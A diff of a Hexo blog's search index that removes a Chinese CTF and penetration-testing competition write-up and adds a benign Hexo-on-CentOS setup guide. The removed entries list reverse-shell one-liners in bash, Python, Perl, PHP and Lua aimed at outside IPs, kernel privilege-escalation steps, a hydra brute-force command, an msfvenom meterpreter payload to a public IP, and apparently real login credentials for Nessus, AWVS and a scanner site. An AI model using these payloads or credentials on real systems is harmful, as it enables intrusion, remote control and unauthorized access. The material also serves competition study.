@@ -1,26 +1,11 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title><![CDATA[archives]]></title>
-    <url>%2F2019%2F10%2F09%2Farchives%2F</url>
-    <content type="text"></content>
-  </entry>
-  <entry>
-    <title><![CDATA[比赛]]></title>
-    <url>%2F2019%2F10%2F09%2F%E6%AF%94%E8%B5%9B-1%2F</url>
-    <content type="text"><![CDATA[2019第二届江苏省网络空间安全（保密）知识技能大赛总结前言：这次的省赛虽然经历了一些波折，虽然自己仍然很菜，但是在队友的加持下拿到了一等奖。先吐槽一下初赛，是迄今为止打过最烂的ctf，差点没进得了决赛，还好老师找人沟通了一下。决赛有点像护网，都是真实的网站进行真实的渗透测试，测试的网站是由抽签决定的，其实有很大的运气成分，但是实力很重要，这次比赛学到了很多实战方面的东西，暑假到现在的安服工作也对我有很大的帮助。 由于漏洞是网站真实存在的，不能记录太多细节，所以这里只记录一些思路和总结 反弹shell常用方法：在拿到RCE后可以反弹shell，需要一台公网ip机器 通过nc反弹shell利用RCE执行：bash -i-&gt;&amp;/dev/tcp/ip/port 0-&gt;&amp;1 ip和port为自己公网主机的 公网ip主机执行：nc -lvp 通过python反弹shell利用RCE执行： 1python -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ip',port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);" ip和port为自己公网主机的 公网ip主机执行：nc -lvp perl反弹shell利用RCE执行 1perl -e 'use Socket;$i="10.1.1.19";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;' 公网ip主机执行：nc -lvp php反弹shell（php是世界上最好的语言）利用RCE执行 1php -r '$sock=fsockopen("10.1.1.19",8080);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");' 公网ip主机执行：nc -lvp lua反弹shell利用RCCE执行 1lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.1.1.19','8080');os.execute('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');" 公网ip主机执行：nc -lvp 提权常用方法反弹shell后权限一般较低，提权的方法挺多 提权方式： SUID提权，大师傅说这个方法实战很少，暂不深入，可参考网站 https://www.freebuf.com/articles/system/149118.html 内核提权 内核提权查看发行版 12cat /etc/issuecat cat /etc/*-release 查看内核版本 1uname -a 大多内核漏洞通过内核版本就可搜到 用kali自带的searchsploit来搜索exploitdb中的漏洞利用代码 1searchspoit linux 2.6 ubuntu priv esc 一般www权限可以在/tmp/目录（linux）或者c:\windows\system32\temp目录（windows）下有写的权限]]></content>
-  </entry>
-  <entry>
-    <title><![CDATA[比赛]]></title>
-    <url>%2F2019%2F10%2F09%2F%E6%AF%94%E8%B5%9B%2F</url>
-    <content type="text"><![CDATA[nessushttps://60.205.228.7:8834/#/ Dozer/Dozer@2019 awvshttps://218.78.20.226:3443/#/ Dozer@Dozer.comDozer@2019 hydra / namphydra -s 23 -V -l admin -P Weskpass/[filename] -t 16 -M IP地址目录 telnet； 22 23 380 1521 21 5900 3306 1433 masscan -p 22 w12 scanhttp://www.shangdongshe.club:8086/user/loginusername:boyhackpassword:boyhack msfmsfvenom -p windows/meterpreter/reverse_tcp LHOST=39.108.222.8 LPORT=9999 -f exe -a x86 –platform win -o shell.exe 39.108.228.8:9999 use exploit/multi/hanlder set payload windows/meterpreter/reverse_tcp]]></content>
+    <title><![CDATA[hexo踩坑记（centos7篇）]]></title>
+    <url>%2F2019%2F10%2F09%2Fhexo%E8%B8%A9%E5%9D%91%E8%AE%B0%EF%BC%88centos7%E7%AF%87%EF%BC%89%2F</url>
+    <content type="text"><![CDATA[hexo踩坑记（centos7篇）听说hexo是一个很好用的静态博客 因为静态不像动态那样会出现很多安全问题，占用的系统资源很小，而且可以托管到github上，虽说托管到github上后速度有点慢，托管到coding上好像会好点，反正就我自己当笔记用，⑧是问题。网上教程很多，也很杂，有的坑别人没踩自己踩了所以记录一下 进入正题 前提安装 git node-js git很简单，直接用yum安装，可以导入一下key这样就不用每次都输入账户密码了 npm和node-js都是一起的，安装其中一个另一个也就有了，直接yum安装npm后会因为版本太低在安装hexo时报错，我问了别人好像没我这种问题，可以直接装了试试，我是编译安装node-js的最新版本，花了好久 hexo安装和启动 npm install hexo-cli -g安装hexo hexo init blog到一个你常用的目录下初始化，blog可以改为你喜欢的文件夹名字，结束后可以发现当前文件夹下的blog文件夹 npm install这一步要进入blog文件夹（据说不需要这一步也可以） hexo s这样hexo服务就在本地的4000端口开启了，只能通过本地访问，那么问题来了，vps没有图形化怎么确定是否能够访问？第一个想到了curl，真tm为我的机智点赞，然鹅，ctrl+z出来后进行curl http://localhost:4000，太棒了！什么回显都没有，然后我被卡了半天，一直以为是环境有啥问题，或者配置有啥问题，大晚上的左思右想，就这几步操作不会有啥问题啊，人家不都一把梭嘛。直到第二天，我开了一个ssh窗口启动hexo，再开了一个ssh的窗口用curl…wdnmd有回显了，难道这就是玄学？是我不配，要不是没有技术，谁又愿意当一个菜鸡 然后就顺利多了 关联github 首先在github上创建名为xxx.github.io的项目，xxx为自己的github用户名 在blog文件夹下编辑_config.yml配置文件，将其中的type设置为git,xxx为自己的用户名 1234deploy: type: git repository:https://github.com/xxx/xxx.github.io.git branch: master 运行：npm install hexo-deployer-git -save（我运行的时候报错-save不能用，就去掉了，后续也没有出现问题） 运行：hexo g（本地生成静态文件） 运行：hexo d（将本地静态文件推送至Github） 绑定域名我的国内vps还没有备案，这一步以后再说 更新文章 hexo new “文章名”会在source-&gt;_posts文件下生成一个md文件 以md规则编辑该文件 修改起始字段 编辑正文内容 hexo clean删除本地静态文件（可以不执行） hexo g生成本地静态文件（Public目录） hexo d将本地静态文件推送至github（hexo d） 这边会提醒输入账户密码，也可以采用不输入账户密码的方法，更改_config.yml中的deploy即可 美化我参照了网上的一些文章进行的美化，直男审美，所以网站看起来比较朴素 完成了，舒服了 我参考的文章https://www.jianshu.com/p/60f5c84aa5a8https://thief.one/2017/03/03/Hexo搭建博客教程/]]></content>
       <tags>
-        <tag>比赛总结</tag>
+        <tag>踩坑记</tag>
       </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[Hello World]]></title>
-    <url>%2F2019%2F10%2F08%2Fhello-world%2F</url>
-    <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new "My New Post" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment]]></content>
   </entry>
 </search>
